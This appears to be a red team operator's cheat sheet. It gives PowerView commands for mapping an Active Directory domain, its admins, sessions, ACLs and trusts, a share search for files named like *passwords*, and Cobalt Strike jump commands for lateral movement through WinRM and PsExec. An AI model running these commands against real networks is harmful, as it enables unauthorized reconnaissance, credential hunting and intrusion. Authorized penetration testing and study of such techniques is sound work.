---
title: "Red Team Operator NOTES"
date: 2021-11-16
draft: false
---

# Tools used
- PowerView/SharpView
- PowerUp/SharpUp
- Rubeus
- Impacket
- Mimikatz
- Bloodhound
- PowerUpSQL
- Seatbelt


# Domain Recon

## PowerView / SharpView
- Get current domain: `Get-Domain`
- Get domain SID: `Get-DomainSID`


- Enumerating domain computers:
 `Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName`
 
- Get domain groups with "admin":
 `Get-DomainGroup | where Name -like "Admins" | select SamAccountName`

- Enumerate users in domain group:
`Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName`

- Find computers where a user has a session:
`Find-DomainUserLocation | Select-Object UserName, SessionFromName`

- Enumerate users logged on to a machine:
`Get-NetLoggedon -ComputerName <ComputerName>`


- Enumerating file shares:
````
#Enumerate Domain Shares
Find-DomainShare

#Enumerate Domain Shares the current user has access
Find-DomainShare -CheckShareAccess

#Enumerate "Interesting" Files on accessible shares
Find-InterestingDomainShareFile -Include *passwords*
````

- Enumerating ACLs:
````
Get-DomainObjectAcl -Identity <AccountName> -ResolveGUIDs
````

- Enumerating Domain and Forest Trusts:
```
Get-DomainTrust
Get-DomainTrust -Domain <DomainName>

#Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
Get-DomainTrustMapping

# Enumerating Forest Trust
Get-ForestTrust
Get-ForestTrust -Forest <ForestName>
```


# Local Privilege Escalation
- PowerUp.ps1
- SharpUp.exe


# Lateral Movement
## Cobalt Strike's jump method
- Powershell Remoting:
`jump winrm <target> <listener>`
`jump winrm64 <target> <listener>`

- PsExec: Copies a service binary to ADMIN$ and executes via SCM.
Cobalt Strike's jump will automatically migrate the process into rundll32.exe to delete service binary from disk.
`jump psexec <target> <listener>`
`jump psexec64 <target> <listener>`
